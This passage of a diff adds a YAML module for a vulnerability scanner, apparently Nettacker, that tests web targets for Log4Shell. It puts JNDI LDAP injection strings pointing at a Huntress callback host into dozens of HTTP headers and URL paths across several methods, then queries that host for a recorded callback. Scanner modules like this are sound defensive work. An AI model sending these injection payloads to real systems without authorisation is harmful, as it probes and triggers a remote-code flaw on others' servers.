+          - Accept-Charset: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Datetime: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Language: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Method: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Headers: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cache-Control: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-MD5: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Type: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cookie: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Date: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Expect: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Forwarded: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - From: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - HTTP2-Settings: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Modified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-None-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Unmodified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Max-Forwards: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Origin: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Pragma: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Prefer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Referer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - TE: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Trailer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Transfer-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - User-Agent: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Via: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Warning: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade-Insecure-Requests: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Requested-With: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - DNT: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-For: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Host: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Proto: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Front-End-Https: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-HTTP-Method-Override: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Att-Deviceid: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - x-wap-profile: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-UIDH: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Csrf-Token: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              path:
+                - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - ""
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          save_to_temp_events_only: log4shell_junk5
+          dependent_on_temp_event: log4shell_token
+          condition_type: and
+          conditions:
+            content:
+              regex: ''
+              reverse: false
+
+      - method: patch
+        timeout: 3
+        headers:
+          - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Charset: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Datetime: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Language: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Method: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Headers: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cache-Control: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-MD5: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Type: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cookie: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Date: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Expect: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Forwarded: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - From: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - HTTP2-Settings: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Modified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-None-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Unmodified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Max-Forwards: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Origin: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Pragma: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Prefer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Referer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - TE: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Trailer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Transfer-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - User-Agent: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Via: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Warning: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade-Insecure-Requests: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Requested-With: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - DNT: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-For: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Host: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Proto: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Front-End-Https: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-HTTP-Method-Override: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Att-Deviceid: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - x-wap-profile: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-UIDH: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Csrf-Token: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              path:
+                - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - ""
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          save_to_temp_events_only: log4shell_junk6
+          dependent_on_temp_event: log4shell_token
+          condition_type: and
+          conditions:
+            content:
+              regex: ''
+              reverse: false
+
+      - method: delete
+        timeout: 3
+        headers:
+          - A-IM: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Charset: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Datetime: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Accept-Language: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Method: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Access-Control-Request-Headers: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cache-Control: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-MD5: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Content-Type: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Cookie: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Date: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Expect: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Forwarded: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - From: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - HTTP2-Settings: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Modified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-None-Match: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - If-Unmodified-Since: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Max-Forwards: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Origin: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Pragma: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Prefer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Authorization: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Range: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Referer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - TE: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Trailer: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Transfer-Encoding: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - User-Agent: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Via: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Warning: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Upgrade-Insecure-Requests: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Requested-With: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - DNT: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-For: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Host: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Forwarded-Proto: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Front-End-Https: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-HTTP-Method-Override: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Att-Deviceid: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - x-wap-profile: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Proxy-Connection: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-UIDH: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Csrf-Token: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Request-ID: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - Save-Data: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+          - X-Api-Version: "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              path:
+                - "${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "?q=${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - "#/${{jndi:ldap://log4shell.huntress.com:1389/dependent_on_temp_event[0]['content'][0]}}"
+                - ""
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          save_to_temp_events_only: log4shell_junk7
+          dependent_on_temp_event: log4shell_token
+          condition_type: and
+          conditions:
+            content:
+              regex: ''
+              reverse: false
+
+      # this request must stay in -1 position
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        url:
+          nettacker_fuzzer:
+            input_format: "https://log4shell.huntress.com/json/{{token}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              token:
+                - "dependent_on_temp_event[0]['content'][0]"
+        response:
+          dependent_on_temp_event: log4shell_token,log4shell_junk1,log4shell_junk2,log4shell_junk3,log4shell_junk4,log4shell_junk5,log4shell_junk6,log4shell_junk7
+          condition_type: and
+          conditions:
+            content:
+              regex: (25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)
+              reverse: false
